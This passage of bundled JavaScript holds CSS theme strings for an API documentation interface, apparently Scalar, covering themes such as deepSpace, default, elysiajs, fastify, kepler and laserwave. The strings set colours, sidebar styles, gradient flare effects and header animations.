forwards;\n  animation-timeline: scroll();\n  animation-range: 0px 200px;\n}\n\n/* Document Layout */\n.dark-mode .t-doc .layout-content {\n  background: transparent;\n}\n\n.dark-mode h2.t-editor__heading,\n.dark-mode .t-editor__page-title h1,\n.dark-mode h1.section-header:not(::selection),\n.dark-mode .markdown h1,\n.dark-mode .markdown h2,\n.dark-mode .markdown h3,\n.dark-mode .markdown h4,\n.dark-mode .markdown h5,\n.dark-mode .markdown h6 {\n  -webkit-text-fill-color: transparent;\n  background-image: linear-gradient(to right bottom, rgb(255, 255, 255) 30%, rgba(255, 255, 255, 0.38));\n  -webkit-background-clip: text;\n  background-clip: text;\n}\n/* Hero Section Flare */\n.section-flare-item:nth-of-type(1) {\n  --c1: #ffffff;\n  --c2: #babfd8;\n  --c3: #2e8bb2;\n  --c4: #1a8593;\n  --c5: #0a143e;\n  --c6: #0a0f52;\n  --c7: #2341b8;\n\n  --solid: var(--c1), var(--c2), var(--c3), var(--c4), var(--c5), var(--c6), var(--c7);\n  --solid-wrap: var(--solid), var(--c1);\n  --trans:\n    var(--c1), transparent, var(--c2), transparent, var(--c3),\n    transparent, var(--c4), transparent, var(--c5), transparent, var(--c6),\n    transparent, var(--c7);\n  --trans-wrap: var(--trans), transparent, var(--c1);\n\n  background:\n    radial-gradient(circle, var(--trans)), conic-gradient(from 180deg, var(--trans-wrap)),\n    radial-gradient(circle, var(--trans)), conic-gradient(var(--solid-wrap));\n  width: 70vw;\n  height: 700px;\n  border-radius: 50%;\n  filter: blur(100px);\n  z-index: 0;\n  right: 0;\n  position: absolute;\n  transform: rotate(-45deg);\n  top: -300px;\n  opacity: 0.3;\n}\n.section-flare-item:nth-of-type(3) {\n  --star-color: #6b9acc;\n  --star-color2: #446b8d;\n  --star-color3: #3e5879;\n  background-image:\n    radial-gradient(2px 2px at 20px 30px, var(--star-color2), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 40px 70px, var(--star-color), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 50px 160px, var(--star-color3), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 90px 40px, var(--star-color), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 130px 80px, var(--star-color), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 160px 120px, var(--star-color3), rgba(0, 0, 0, 0));\n  background-repeat: repeat;\n  background-size: 200px 200px;\n  width: 100%;\n  height: 100%;\n  mask-image: radial-gradient(ellipse at 100% 0%, black 40%, transparent 70%);\n}\n.section-flare {\n  top: -150px !important;\n  height: 100vh;\n  background: linear-gradient(#000, var(--scalar-background-1));\n  width: 100vw;\n  overflow-x: hidden;\n}\n.light-mode .section-flare {\n  display: none;\n}\n.light-mode .scalar-card {\n  --scalar-background-1: #fff;\n  --scalar-background-2: #fff;\n  --scalar-background-3: #fff;\n}\n\n*::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-blue), transparent 60%);\n}\n\n@media (max-width: 1000px) {\n  .light-mode .t-doc__sidebar,\n  .dark-mode .t-doc__sidebar {\n    --scalar-sidebar-background-1: var(--scalar-background-1);\n  }\n  .light-mode .t-doc__header,\n  .dark-mode .t-doc__header {\n    animation: none;\n    background: var(--scalar-header-background-1);\n    backdrop-filter: blur(12px);\n  }\n}\n";
var deepSpace_default = "/* basic theme */\n:root {\n  --scalar-text-decoration: underline;\n  --scalar-text-decoration-hover: underline;\n}\n.light-mode {\n  --scalar-color-1: rgb(9, 9, 11);\n  --scalar-color-2: rgb(113, 113, 122);\n  --scalar-color-3: rgba(25, 25, 28, 0.5);\n  --scalar-color-accent: var(--scalar-color-1);\n\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f4f4f5;\n  --scalar-background-3: #e3e3e6;\n  --scalar-background-accent: #8ab4f81f;\n\n  --scalar-border-color: rgb(228, 228, 231);\n  --scalar-code-language-color-supersede: var(--scalar-color-1);\n}\n.dark-mode {\n  --scalar-color-1: #fafafa;\n  --scalar-color-2: rgb(161, 161, 170);\n  --scalar-color-3: rgba(255, 255, 255, 0.533);\n  --scalar-color-accent: var(--scalar-color-1);\n\n  --scalar-background-1: #09090b;\n  --scalar-background-2: #18181b;\n  --scalar-background-3: #2c2c30;\n  --scalar-background-accent: #8ab4f81f;\n\n  --scalar-border-color: rgba(255, 255, 255, 0.16);\n  --scalar-code-language-color-supersede: var(--scalar-color-1);\n}\n\n/* Document Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-3);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n\n  --scalar-sidebar-search-background: transparent;\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n}\n.light-mode .t-doc__sidebar {\n  --scalar-sidebar-item-active-background: var(--scalar-background-2);\n}\n/* advanced */\n.light-mode {\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #fb892c;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: rgba(69, 255, 165, 0.823);\n  --scalar-color-red: #ff8589;\n  --scalar-color-yellow: #ffcc4d;\n  --scalar-color-blue: #6bc1fe;\n  --scalar-color-orange: #f98943;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #79e2da;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n/* Custom theme */\n.dark-mode h2.t-editor__heading,\n.dark-mode .t-editor__page-title h1,\n.dark-mode h1.section-header:not(::selection),\n.dark-mode .markdown h1,\n.dark-mode .markdown h2,\n.dark-mode .markdown h3,\n.dark-mode .markdown h4,\n.dark-mode .markdown h5,\n.dark-mode .markdown h6 {\n  -webkit-text-fill-color: transparent;\n  background-image: linear-gradient(to right bottom, rgb(255, 255, 255) 30%, rgba(255, 255, 255, 0.38));\n  -webkit-background-clip: text;\n  background-clip: text;\n}\n.examples .scalar-card-footer {\n  --scalar-background-3: transparent;\n  padding-top: 0;\n}\n/* Hero section flare */\n.section-flare {\n  width: 100vw;\n  height: 550px;\n  position: absolute;\n}\n.section-flare-item:nth-of-type(1) {\n  position: absolute;\n  width: 100vw;\n  height: 550px;\n  --stripesDark: repeating-linear-gradient(100deg, #000 0%, #000 7%, transparent 10%, transparent 12%, #000 16%);\n  --rainbow: repeating-linear-gradient(100deg, #fff 10%, #fff 16%, #fff 22%, #fff 30%);\n  background-image: var(--stripesDark), var(--rainbow);\n  background-size: 300%, 200%;\n  background-position:\n    50% 50%,\n    50% 50%;\n  filter: invert(100%);\n  -webkit-mask-image: radial-gradient(ellipse at 100% 0%, black 40%, transparent 70%);\n  mask-image: radial-gradient(ellipse at 100% 0%, black 40%, transparent 70%);\n  pointer-events: none;\n  opacity: 0.07;\n}\n.dark-mode .section-flare-item:nth-of-type(1) {\n  background-image: var(--stripesDark), var(--rainbow);\n  filter: opacity(50%) saturate(200%);\n  opacity: 0.25;\n  height: 350px;\n}\n.section-flare-item:nth-of-type(1):after {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  right: 0;\n  bottom: 0;\n  left: 0;\n  background-image: var(--stripesDark), var(--rainbow);\n  background-size: 200%, 100%;\n  background-attachment: fixed;\n  mix-blend-mode: difference;\n}\n.dark-mode .section-flare:after {\n  background-image: var(--stripesDark), var(--rainbow);\n}\n.section-flare-item:nth-of-type(2) {\n  --star-color: #fff;\n  --star-color2: #fff;\n  --star-color3: #fff;\n  width: 100%;\n  height: 100%;\n  position: absolute;\n  background-image:\n    radial-gradient(2px 2px at 20px 30px, var(--star-color2), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 40px 70px, var(--star-color), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 50px 160px, var(--star-color3), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 90px 40px, var(--star-color), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 130px 80px, var(--star-color), rgba(0, 0, 0, 0)),\n    radial-gradient(2px 2px at 160px 120px, var(--star-color3), rgba(0, 0, 0, 0));\n  background-repeat: repeat;\n  background-size: 200px 200px;\n  mask-image: radial-gradient(ellipse at 100% 0%, black 40%, transparent 70%);\n  opacity: 0.2;\n}\n.light-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-blue), transparent 70%);\n}\n.dark-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-blue), transparent 50%);\n}\n\n/* document header */\n.light-mode .t-doc__header,\n.dark-mode .t-doc__header {\n  animation: headerbackground forwards;\n  animation-timeline: scroll();\n  animation-range: 0px 200px;\n}\n@keyframes headerbackground {\n  from {\n    background: transparent;\n    backdrop-filter: none;\n  }\n  to {\n    background: var(--scalar-header-background-1);\n    backdrop-filter: blur(12px);\n  }\n}\n/* remove flare on safari to prevent dropped frames on scroll */\n@supports (-webkit-hyphens: none) {\n  .section-flare {\n    display: none;\n  }\n}\n\n/* document background */\n.light-mode .t-doc .layout-content,\n.dark-mode .t-doc .layout-content {\n  background: transparent;\n}\n";
var default_default = "/* basic theme */\n:root {\n  --scalar-text-decoration: underline;\n  --scalar-text-decoration-hover: underline;\n}\n.light-mode {\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f6f6f6;\n  --scalar-background-3: #e7e7e7;\n  --scalar-background-accent: #8ab4f81f;\n\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n\n  --scalar-color-accent: #0099ff;\n  --scalar-border-color: #dfdfdf;\n}\n.dark-mode {\n  --scalar-background-1: #0f0f0f;\n  --scalar-background-2: #1a1a1a;\n  --scalar-background-3: #272727;\n\n  --scalar-color-1: #e7e7e7;\n  --scalar-color-2: #a4a4a4;\n  --scalar-color-3: #797979;\n\n  --scalar-color-accent: #00aeff;\n  --scalar-background-accent: #3ea6ff1f;\n\n  --scalar-border-color: #2d2d2d;\n}\n/* Document Sidebar */\n.light-mode,\n.dark-mode {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: var(--scalar-sidebar-color-2);\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-2);\n  --scalar-sidebar-color-active: var(--scalar-sidebar-color-1);\n\n  --scalar-sidebar-indent-border: var(--scalar-sidebar-border-color);\n  --scalar-sidebar-indent-border-hover: var(--scalar-sidebar-border-color);\n  --scalar-sidebar-indent-border-active: var(--scalar-sidebar-border-color);\n\n  --scalar-sidebar-search-background: color-mix(in srgb, var(--scalar-background-2), var(--scalar-background-1));\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n}\n/* advanced */\n.light-mode {\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #ff5800;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-link-color: var(--scalar-color-1);\n  --scalar-link-color-hover: var(--scalar-link-color);\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n\n  --scalar-tooltip-background: color-mix(in srgb, var(--scalar-background-1), transparent 10%);\n  --scalar-tooltip-color: var(--scalar-color-1);\n\n  --scalar-color-alert: color-mix(in srgb, var(--scalar-color-orange), var(--scalar-color-1) 20%);\n  --scalar-color-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-color-1) 20%);\n\n  --scalar-background-alert: color-mix(in srgb, var(--scalar-color-orange), var(--scalar-background-1) 95%);\n  --scalar-background-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-background-1) 95%);\n}\n.dark-mode {\n  --scalar-color-green: #00b648;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #ffc90d;\n  --scalar-color-blue: #4eb3ec;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #65d4cf;\n\n  --scalar-link-color: var(--scalar-color-1);\n  --scalar-link-color-hover: var(--scalar-link-color);\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n\n  --scalar-tooltip-background: color-mix(in srgb, var(--scalar-background-1), #fff 10%);\n  --scalar-tooltip-color: color-mix(in srgb, #fff, transparent 5%);\n\n  --scalar-color-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-background-1) 20%);\n\n  --scalar-background-alert: color-mix(in srgb, var(--scalar-color-orange), var(--scalar-background-1) 95%);\n  --scalar-background-danger: color-mix(in srgb, var(--scalar-color-red), var(--scalar-background-1) 95%);\n}\n@supports (color: color(display-p3 1 1 1)) {\n  .light-mode {\n    --scalar-color-accent: color(display-p3 0 0.6 1 / 1);\n    --scalar-color-green: color(display-p3 0.023529 0.564706 0.380392 / 1);\n    --scalar-color-red: color(display-p3 0.937255 0 0.023529 / 1);\n    --scalar-color-yellow: color(display-p3 0.929412 0.745098 0.12549 / 1);\n    --scalar-color-blue: color(display-p3 0 0.509804 0.815686 / 1);\n    --scalar-color-orange: color(display-p3 1 0.4 0.02);\n    --scalar-color-purple: color(display-p3 0.321569 0.011765 0.819608 / 1);\n  }\n  .dark-mode {\n    --scalar-color-accent: color(display-p3 0.07 0.67 1);\n    --scalar-color-green: color(display-p3 0 0.713725 0.282353 / 1);\n    --scalar-color-red: color(display-p3 0.862745 0.105882 0.098039 / 1);\n    --scalar-color-yellow: color(display-p3 1 0.788235 0.05098 / 1);\n    --scalar-color-blue: color(display-p3 0.305882 0.701961 0.92549 / 1);\n    --scalar-color-orange: color(display-p3 1 0.552941 0.301961 / 1);\n    --scalar-color-purple: color(display-p3 0.694118 0.568627 0.976471 / 1);\n  }\n}\n";
var elysiajs_default = ".light-mode {\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n  --scalar-color-accent: #f06292;\n\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f6f6f6;\n  --scalar-background-3: #e7e7e7;\n\n  --scalar-border-color: rgba(0, 0, 0, 0.1);\n}\n.dark-mode {\n  --scalar-color-1: rgba(255, 255, 255, 0.9);\n  --scalar-color-2: rgba(156, 163, 175, 1);\n  --scalar-color-3: rgba(255, 255, 255, 0.44);\n  --scalar-color-accent: #f06292;\n\n  --scalar-background-1: #111728;\n  --scalar-background-2: #1e293b;\n  --scalar-background-3: #334155;\n  --scalar-background-accent: #f062921f;\n\n  --scalar-border-color: rgba(255, 255, 255, 0.1);\n}\n\n/* Document Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: currentColor;\n\n  --scalar-sidebar-item-active-background: #f062921f;\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n\n  --scalar-sidebar-search-background: transparent;\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n}\n\n/* advanced */\n.light-mode {\n  --scalar-button-1: rgb(49 53 56);\n  --scalar-button-1-color: #fff;\n  --scalar-button-1-hover: rgb(28 31 33);\n\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #fb892c;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-scrollbar-color: rgba(0, 0, 0, 0.18);\n  --scalar-scrollbar-color-active: rgba(0, 0, 0, 0.36);\n}\n.dark-mode {\n  --scalar-button-1: #f6f6f6;\n  --scalar-button-1-color: #000;\n  --scalar-button-1-hover: #e7e7e7;\n\n  --scalar-color-green: #a3ffa9;\n  --scalar-color-red: #ffa3a3;\n  --scalar-color-yellow: #fffca3;\n  --scalar-color-blue: #a5d6ff;\n  --scalar-color-orange: #e2ae83;\n  --scalar-color-purple: #d2a8ff;\n  --scalar-color-query: #a5f3df;\n\n  --scalar-scrollbar-color: rgba(255, 255, 255, 0.24);\n  --scalar-scrollbar-color-active: rgba(255, 255, 255, 0.48);\n}\n.section-flare {\n  width: 100%;\n  height: 400px;\n  position: absolute;\n}\n.section-flare-item:first-of-type:before {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  right: 0;\n  bottom: 0;\n  left: 0;\n  --stripes: repeating-linear-gradient(100deg, #fff 0%, #fff 0%, transparent 2%, transparent 12%, #fff 17%);\n  --stripesDark: repeating-linear-gradient(100deg, #000 0%, #000 0%, transparent 10%, transparent 12%, #000 17%);\n  --rainbow: repeating-linear-gradient(100deg, #60a5fa 10%, #e879f9 16%, #5eead4 22%, #60a5fa 30%);\n  contain: strict;\n  contain-intrinsic-size: 100vw 40vh;\n  background-image: var(--stripesDark), var(--rainbow);\n  background-size: 300%, 200%;\n  background-position:\n    50% 50%,\n    50% 50%;\n  filter: opacity(20%) saturate(200%);\n  -webkit-mask-image: radial-gradient(ellipse at 100% 0%, black 40%, transparent 70%);\n  mask-image: radial-gradient(ellipse at 100% 0%, black 40%, transparent 70%);\n  pointer-events: none;\n}\n.section-flare-item:first-of-type:after {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  right: 0;\n  bottom: 0;\n  left: 0;\n  background-image: var(--stripes), var(--rainbow);\n  background-size: 200%, 100%;\n  background-attachment: fixed;\n  mix-blend-mode: difference;\n  background-image: var(--stripesDark), var(--rainbow);\n  pointer-events: none;\n}\n.light-mode .section-flare-item:first-of-type:after,\n.light-mode .section-flare-item:first-of-type:before {\n  background-image: var(--stripes), var(--rainbow);\n  filter: opacity(4%) saturate(200%);\n}\n";
var fastify_default = ".light-mode {\n  color-scheme: light;\n  --scalar-color-1: #1c1e21;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n  --scalar-color-disabled: #b4b1b1;\n  --scalar-color-ghost: #a7a7a7;\n  --scalar-color-accent: #2f8555;\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f5f5f5;\n  --scalar-background-3: #ededed;\n  --scalar-background-4: rgba(0, 0, 0, 0.06);\n  --scalar-background-accent: #2f85551f;\n\n  --scalar-border-color: rgba(0, 0, 0, 0.1);\n  --scalar-scrollbar-color: rgba(0, 0, 0, 0.18);\n  --scalar-scrollbar-color-active: rgba(0, 0, 0, 0.36);\n  --scalar-lifted-brightness: 1;\n  --scalar-backdrop-brightness: 1;\n\n  --scalar-shadow-1: 0 1px 3px 0 rgba(0, 0, 0, 0.11);\n  --scalar-shadow-2: rgba(0, 0, 0, 0.08) 0px 13px 20px 0px, rgba(0, 0, 0, 0.08) 0px 3px 8px 0px, #eeeeed 0px 0 0 1px;\n\n  --scalar-button-1: rgb(49 53 56);\n  --scalar-button-1-color: #fff;\n  --scalar-button-1-hover: rgb(28 31 33);\n\n  --scalar-color-green: #007300;\n  --scalar-color-red: #af272b;\n  --scalar-color-yellow: #b38200;\n  --scalar-color-blue: #3b8ba5;\n  --scalar-color-orange: #fb892c;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #00766f;\n}\n\n.dark-mode {\n  color-scheme: dark;\n  --scalar-color-1: rgba(255, 255, 255, 0.9);\n  --scalar-color-2: rgba(255, 255, 255, 0.62);\n  --scalar-color-3: rgba(255, 255, 255, 0.44);\n  --scalar-color-disabled: rgba(255, 255, 255, 0.34);\n  --scalar-color-ghost: rgba(255, 255, 255, 0.26);\n  --scalar-color-accent: #27c2a0;\n  --scalar-background-1: #1b1b1d;\n  --scalar-background-2: #242526;\n  --scalar-background-3: #3b3b3b;\n  --scalar-background-4: rgba(255, 255, 255, 0.06);\n  --scalar-background-accent: #27c2a01f;\n\n  --scalar-border-color: rgba(255, 255, 255, 0.1);\n  --scalar-scrollbar-color: rgba(255, 255, 255, 0.24);\n  --scalar-scrollbar-color-active: rgba(255, 255, 255, 0.48);\n  --scalar-lifted-brightness: 1.45;\n  --scalar-backdrop-brightness: 0.5;\n\n  --scalar-shadow-1: 0 1px 3px 0 rgb(0, 0, 0, 0.1);\n  --scalar-shadow-2:\n    rgba(15, 15, 15, 0.2) 0px 3px 6px, rgba(15, 15, 15, 0.4) 0px 9px 24px, 0 0 0 1px rgba(255, 255, 255, 0.1);\n\n  --scalar-button-1: #f6f6f6;\n  --scalar-button-1-color: #000;\n  --scalar-button-1-hover: #e7e7e7;\n\n  --scalar-color-green: #26b226;\n  --scalar-color-red: #fb565b;\n  --scalar-color-yellow: #ffc426;\n  --scalar-color-blue: #6ecfef;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #5fdbc5;\n}\n";
var kepler_default = "/* basic theme */\n.light-mode {\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n  --scalar-color-accent: #7070ff;\n\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f6f6f6;\n  --scalar-background-3: #e7e7e7;\n  --scalar-background-accent: #7070ff1f;\n\n  --scalar-border-color: rgba(0, 0, 0, 0.1);\n\n  --scalar-code-language-color-supersede: var(--scalar-color-3);\n}\n.dark-mode {\n  --scalar-color-1: #f7f8f8;\n  --scalar-color-2: rgb(180, 188, 208);\n  --scalar-color-3: #b4bcd099;\n  --scalar-color-accent: #828fff;\n\n  --scalar-background-1: #000212;\n  --scalar-background-2: #0d0f1e;\n  --scalar-background-3: #232533;\n  --scalar-background-accent: #8ab4f81f;\n\n  --scalar-border-color: #313245;\n  --scalar-code-language-color-supersede: var(--scalar-color-3);\n}\n/* Document Sidebar */\n.light-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n  --scalar-sidebar-search-background: rgba(0, 0, 0, 0.05);\n  --scalar-sidebar-search-border-color: 1px solid rgba(0, 0, 0, 0.05);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-background-2: rgba(0, 0, 0, 0.03);\n}\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-active-background: rgba(255, 255, 255, 0.1);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n  --scalar-sidebar-search-background: rgba(255, 255, 255, 0.1);\n  --scalar-sidebar-search-border-color: 1px solid rgba(255, 255, 255, 0.05);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n}\n/* advanced */\n.light-mode {\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #fb892c;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: #00b648;\n  --scalar-color-red: #dc1b19;\n  --scalar-color-yellow: #ffc90d;\n  --scalar-color-blue: #4eb3ec;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #65d4cf;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n/* Custom Theme */\n.dark-mode h2.t-editor__heading,\n.dark-mode .t-editor__page-title h1,\n.dark-mode h1.section-header:not(::selection),\n.dark-mode .markdown h1,\n.dark-mode .markdown h2,\n.dark-mode .markdown h3,\n.dark-mode .markdown h4,\n.dark-mode .markdown h5,\n.dark-mode .markdown h6 {\n  -webkit-text-fill-color: transparent;\n  background-image: linear-gradient(to right bottom, rgb(255, 255, 255) 30%, rgba(255, 255, 255, 0.38));\n  -webkit-background-clip: text;\n  background-clip: text;\n}\n.sidebar-search {\n  backdrop-filter: blur(12px);\n}\n@keyframes headerbackground {\n  from {\n    background: transparent;\n    backdrop-filter: none;\n  }\n  to {\n    background: var(--scalar-header-background-1);\n    backdrop-filter: blur(12px);\n  }\n}\n.dark-mode .scalar-card {\n  background: rgba(255, 255, 255, 0.05) !important;\n}\n.dark-mode .scalar-card * {\n  --scalar-background-2: transparent !important;\n  --scalar-background-1: transparent !important;\n}\n.light-mode .dark-mode.scalar-card *,\n.light-mode .dark-mode.scalar-card {\n  --scalar-background-1: #0d0f1e !important;\n  --scalar-background-2: #0d0f1e !important;\n  --scalar-background-3: #191b29 !important;\n}\n.light-mode .dark-mode.scalar-card {\n  background: #191b29 !important;\n}\n.badge {\n  box-shadow: 0 0 0 1px var(--scalar-border-color);\n  margin-right: 6px;\n}\n\n.table-row.required-parameter .table-row-item:nth-of-type(2):after {\n  background: transparent;\n  box-shadow: none;\n}\n/* Hero Section Flare */\n.section-flare {\n  width: 100vw;\n  background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(120, 119, 198, 0.3), transparent);\n  height: 100vh;\n}\n.light-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 70%);\n}\n.dark-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-accent), transparent 50%);\n}\n\n/* document layout */\n.light-mode .t-doc .layout-content,\n.dark-mode .t-doc .layout-content {\n  background: transparent;\n}\n";
var laserwave_default = "/* basic theme */\n.light-mode {\n  color-scheme: light;\n  --scalar-color-1: #322b3b;\n  --scalar-color-2: #645676;\n  --scalar-color-3: #9789a9;\n  --scalar-color-accent: #40b4c4;\n\n  --scalar-background-1: #fff;\n  --scalar-background-2: #f4f2f7;\n  --scalar-background-3: #cfc7dc;\n  --scalar-background-accent: #f3fafb;\n\n  --scalar-border-color: #e4e0eb;\n}\n.dark-mode {\n  color-scheme: dark;\n  --scalar-color-1: #fff;\n  --scalar-color-2: #b8b6ba;\n  --scalar-color-3: #706c74;\n  --scalar-color-accent: #ed78c2;\n\n  --scalar-background-1: #27212e;\n  --scalar-background-2: #322c39;\n  --scalar-background-3: #4c4059;\n  --scalar-background-accent: #eb64b91f;\n\n  --scalar-border-color: rgba(255, 255, 255, 0.1);\n}\n\n/* Sidebar */\n.light-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n  --scalar-sidebar-search-background: var(--scalar-background-2);\n  --scalar-sidebar-search-border-color: var(--scalar-sidebar-border-color);\n  --scalar-sidebar-search--color: var(--scalar-color-3);\n}\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-item-hover-color: currentColor;\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n  --scalar-sidebar-search-background: var(--scalar-background-2);\n  --scalar-sidebar-search-border-color: #514c56;\n  --scalar-sidebar-search--color: var(--scalar-color-3);\n}\n/* advanced */\n.light-mode {\n  --scalar-button-1: rgb(49 53 56);\n  --scalar-button-1-color: #fff;\n  --scalar-button-1-hover: rgb(28 31 33);\n\n  --scalar-color-green: #74dfc4;\n  --scalar-color-red: #d887f5;\n  --scalar-color-yellow: #ffe261;\n  --scalar-color-blue: 